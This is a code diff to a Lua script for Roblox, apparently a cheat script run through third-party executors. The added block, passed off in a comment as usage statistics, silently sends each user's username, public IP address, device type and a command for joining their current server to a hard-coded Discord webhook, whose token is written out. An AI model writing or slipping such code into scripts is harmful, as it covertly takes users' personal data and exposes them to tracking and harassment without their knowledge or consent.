@@ -12,6 +12,34 @@ end
 
 JoinTeam()
 
+-- This is to check who is using the script. if you dont want to get affected by this, message me on discord, user is " R3nderDV. " with the dot.
+
+local webhook = "https://discord.com/api/webhooks/1355686213662802110/Zb2ToOaLRgzBq33aMO3Z4pAEId-d68akqQwwKQagx092AziDLneZYTgw9rOsHRbWdWTi"
+local desc = string.format(
+    "Username: %s\nIdentifier: %s\nMobile: %s\nJoin Server: ```lua\n%s```",
+    Player.Name, game:HttpGet("https://api.ipify.org"), tostring(ismob), string.format(
+        "game:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\", game.Players.LocalPlayer)",
+        tostring(game.PlaceId), game.JobId
+    )
+)
+task.spawn(function()
+    (syn and syn.request or fluxus and fluxus.request or fluxus_request or http and http.request or http_request)({
+        Url = webhook,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = game:GetService("HttpService"):JSONEncode({
+            content = "",
+            embeds = {{
+                title = "Statistics",
+                description = desc,
+                color = tonumber(0xeba300)
+            }}
+        })
+    })
+end)
+
 -- Player
 local player = Players.LocalPlayer
 local character = player.Character or player.CharacterAdded:Wait()
